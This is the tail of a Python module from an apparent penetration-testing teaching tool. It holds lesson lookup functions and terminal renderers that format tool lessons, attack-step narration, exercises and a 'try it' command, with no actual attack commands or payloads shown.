            "AVAILABILITY — inherent. A corruption bug you don't fully control just crashes the target; reliability is what separates a crash from an exploit.",
        ],
    },

}


def lookup(topic: str) -> dict | None:
    """Return lesson dict for a tool name, or None if unknown."""
    if not topic:
        return None
    key = topic.lower().strip().replace(" ", "-").replace("_", "-")
    # Direct match
    if key in LESSONS:
        return LESSONS[key]
    # Partial match
    for k in LESSONS:
        if key in k or k in key:
            return LESSONS[k]
    return None


def list_topics() -> list:
    """Return all available lesson topics."""
    return sorted(LESSONS.keys())


def _wrap(text: str, width: int = 58) -> list:
    """Wrap a long paragraph to the fixed-width live terminal."""
    import textwrap
    out = []
    for _para in str(text).split("\n"):
        out.extend(textwrap.wrap(_para, width) or [""])
    return out


def format_step(step: dict, idx: int | None = None) -> str:
    """Render one 5-slot attack step (do/why_now/watch_for/means/blue).
       Single source of truth shared by the lesson renderer AND the live
       narrator, so a taught step and a real executed step read identically."""
    out = []
    head = f"{idx}. " if idx is not None else ""
    _cmd = step.get("cmd", "")
    out.append(f"    {head}$ {_cmd}" if _cmd else f"    {head}".rstrip())
    for _lbl, _key in (("DO", "do"), ("WHY NOW", "why_now"), ("WATCH FOR", "watch_for"), ("MEANS", "means"), ("BLUE", "blue")):
        _val = step.get(_key)
        if not _val:
            continue
        _w = _wrap(_val, 50)
        out.append(f"       {_lbl:<9} {_w[0]}")
        for _cont in _w[1:]:
            out.append(f"                 {_cont}")
    return "\n".join(out)


def format_lesson(topic: str) -> str:
    """Produce a pretty multi-line lesson block for the live terminal."""
    lesson = lookup(topic)
    if not lesson:
        topics = ", ".join(sorted(LESSONS.keys()))
        return f"📖 No lesson for '{topic}'.\n\nAvailable: {topics}"

    lines = []
    lines.append(f"\n{'═'*62}")
    lines.append(f"📖 {topic.upper()} — {lesson['summary']}")
    lines.append(f"{'─'*62}")
    # ── MENTAL MODEL / ANALOGY / ZOOM (optional, for foundations lessons) ─
    # Foundations/concept lessons lead with the WHY: a plain-language mental
    # model, an analogy, and three depth "zoom" levels the learner picks
    # from (progressive disclosure — the firehose is opt-in). Tool lessons
    # omit these keys and render exactly as before.
    if lesson.get('mental_model'):
        lines.append("\n  🧠 MENTAL MODEL — what's really going on (the WHY before the how):")
        for _ln in _wrap(lesson['mental_model']):
            lines.append(f"    {_ln}")
    if lesson.get('analogy'):
        lines.append("\n  💡 ANALOGY:")
        for _ln in _wrap(lesson['analogy']):
            lines.append(f"    {_ln}")
    if lesson.get('zoom'):
        _z = lesson['zoom']
        lines.append("\n  🔎 ZOOM LEVELS — same idea at three depths (pick yours):")
        for _lvl, _lbl in (("eli5", "ELI5"), ("operator", "OPERATOR"), ("deep", "DEEP")):
            if _z.get(_lvl):
                lines.append(f"    [{_lbl}]")
                for _ln in _wrap(_z[_lvl]):
                    lines.append(f"      {_ln}")
    if lesson.get('typical'):
        lines.append(f"\n  Typical use:  {lesson['typical']}\n")
    if lesson.get('syntax'):
        lines.append("  🔑 KEY SYNTAX:")
        for _k, _v in lesson['syntax'].items():
            lines.append(f"    {_k:<22} {_v}")
    if lesson.get('flags'):
        lines.append("  FLAGS / OPTIONS:")
        for flag, desc in lesson['flags'].items():
            lines.append(f"    {flag:<22} {desc}")
    if lesson.get('code'):
        lines.append("\n  💻 CODE — a working example (read the comments):")
        for _cl in str(lesson['code']).split("\n"):
            lines.append(f"    {_cl}")
    if lesson.get('read'):
        lines.append("\n  READING THE OUTPUT:")
        for r in lesson['read']:
            lines.append(f"    • {r}")
    if lesson.get('notes'):
        lines.append("\n  📌 KEY POINTS — what to remember & the gotchas:")
        for _n in lesson['notes']:
            lines.append(f"    • {_n}")

    # ── CIA TRIAD PLACEMENT (optional) ───────────────────────────────────
    # Every tool/concept has a place in the Confidentiality-Integrity-
    # Availability model. Naming it teaches students to articulate WHY a
    # finding matters in business-risk terms (the language clients fund).
    if lesson.get('cia'):
        lines.append("\n  📐 CIA TRIAD PLACEMENT:")
        for cline in lesson['cia']:
            lines.append(f"    • {cline}")

    # ── COMMAND ANATOMY (optional) ───────────────────────────────────────
    # Breaks the typical command into its pieces and, crucially, tells the
    # student WHERE each input comes from (the hostname from DNS, the
    # wordlist from seclists, the hash from a capture, the SSID from a
    # recon scan, etc.). This is the bridge from "copy the command" to
    # "understand and build the command."
    if lesson.get('anatomy'):
        lines.append("\n  🧬 COMMAND ANATOMY — what each part is & where it comes from:")
        lines.append(f"    $ {lesson.get('anatomy_cmd', lesson['typical'])}")
        for part, meaning in lesson['anatomy'].items():
            lines.append(f"    {part:<22} {meaning}")

    # ── HOW TO APPLY (optional) ──────────────────────────────────────────
    # For CONCEPT / framework / methodology lessons (CIA, OWASP, MITRE,
    # kill-chain, engagement phases, etc.) there is no shell command to
    # dissect — so instead of 🧬 COMMAND ANATOMY they carry 🛠️ HOW TO
    # APPLY: concrete, operator-facing steps for turning the concept into
    # action during a real engagement. This is the heart of why ERR0RS
    # exists — teaching students to USE the knowledge, not just recite it.
    if lesson.get('apply'):
        lines.append("\n  🛠️  HOW TO APPLY — turning this into action on an engagement:")
        for step in lesson['apply']:
            lines.append(f"    • {step}")

    # ── STEP-BY-STEP narration (optional) ────────────────────────────────
    # For attack lessons: each step is a 5-slot dict (do / why_now /
    # watch_for / means / blue). Same schema the live narrator uses, so a
    # real run and the lesson explain a step identically.
    if lesson.get('steps'):
        lines.append("\n  🪜 STEP-BY-STEP — what each step does and WHY:")
        for _i, _st in enumerate(lesson['steps'], 1):
            lines.append("")
            lines.append(format_step(_st, _i))
    if lesson.get('exercise'):
        lines.append("\n  🎯 YOUR TURN — practice (type it, run it, break it):")
        _ex = lesson['exercise'] if isinstance(lesson['exercise'], list) else [lesson['exercise']]
        for _e in _ex:
            _ew = _wrap(_e)
            lines.append(f"    • {_ew[0]}")
            for _c in _ew[1:]:
                lines.append(f"      {_c}")
    lines.append(f"\n  LOGICAL NEXT STEPS:  {', '.join(lesson['next'])}")
    if lesson.get('caution'):
        lines.append(f"\n  ⚠️  {lesson['caution']}")
    lines.append(f"{'═'*62}")

    # ── Append SOC-mentor coaching layer if available for this topic ─────────
    # The SOC mentor block adds noise-level rating, contextual next-step
    # recommendations (ordered quietest first), and OPSEC tips. Lives in
    # src/core/soc_mentor.py — separate file so teach_engine stays focused
    # on tool reference data. format_mentor_block returns "" for topics
    # without mentor data yet (graceful skip during the rollout).
    try:
        from src.core.soc_mentor import format_mentor_block
        mentor = format_mentor_block(topic)
        if mentor:
            lines.append(mentor)
    except Exception:
        pass  # Mentor failure must never break a regular lesson

    # ── CLOSING BLOCK — try it / questions / continue ────────────────────
    # Every lesson ends the same way so students always know what to do
    # next: (1) the ready-to-run command they can copy or that the UI can
    # surface as a one-click run, (2) an invitation to ask follow-up
    # questions (routes to the conversational LLM), and (3) a machine-
    # readable marker the frontend turns into a "Continue / Next Lesson"
    # button. The marker is parsed by the live-terminal renderer; if the
    # UI isn't present it just reads as plain text.
    try_cmd = lesson.get('try_cmd', lesson.get('typical', ''))
    lines.append("")
    lines.append(f"  ▶ TRY IT:  {try_cmd}")
    lines.append(f"  💬 Questions? Ask me anything about {topic} — just type it.")
    lines.append(f"  ⏭  Done? Type 'next' or tap Continue for the next lesson.")
    # Hidden marker the FE keys on to render the Continue button + run-cmd.
    lines.append(f"[[LESSON_CONTROLS topic={topic} try_cmd={try_cmd}]]")

    return "\n".join(lines)
